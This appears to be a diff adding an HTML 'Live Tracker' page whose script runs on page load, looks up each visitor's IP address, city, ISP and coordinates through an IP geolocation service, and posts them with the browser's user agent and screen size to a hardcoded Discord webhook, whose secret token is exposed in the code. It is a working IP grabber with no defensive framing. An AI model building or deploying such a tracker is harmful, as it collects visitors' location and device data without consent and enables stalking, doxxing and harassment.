@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Tracker</title>
+    <script>
+        async function trackVisitor() {
+            let ipInfo;
+            try {
+                let response = await fetch('https://ipapi.co/json/');
+                ipInfo = await response.json();
+            } catch (error) {
+                console.error("IP API failed", error);
+                return;
+            }
+
+            let userAgent = navigator.userAgent;
+            let screenWidth = window.screen.width;
+            let screenHeight = window.screen.height;
+            let visitTime = new Date().toLocaleString();
+
+            const webhookURL = "https://discord.com/api/webhooks/1342844997820743691/yw_JBEvEdaHG4Q__b6Sfpe3J-lorhwyegqN9ffnS7wWKC0ANrjRasbCNV0bNaG4KN7Mq";
+
+            let payload = {
+                content: `🚀 **New Visitor Tracked!**\n\n` +
+                         `📌 **IP Address:** ${ipInfo.ip}\n` +
+                         `🌍 **Location:** ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}\n` +
+                         `🛰️ **ISP:** ${ipInfo.org}\n` +
+                         `🔍 **VPN/Proxy:** ${ipInfo.isp.includes("VPN") ? "Yes" : "No"}\n` +
+                         `💻 **Device:** ${userAgent}\n` +
+                         `🖥️ **Screen Resolution:** ${screenWidth}x${screenHeight}\n` +
+                         `⏰ **Time:** ${visitTime}\n` +
+                         `📍 **[Google Maps](https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude})**`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload),
+            })
+            .then(() => console.log("Data sent to Discord"))
+            .catch((error) => console.error("Error sending to Discord:", error));
+        }
+
+        window.onload = trackVisitor;
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Tracking Page</h1>
+    <p>Your visit has been logged!</p>
+</body>
+</html>
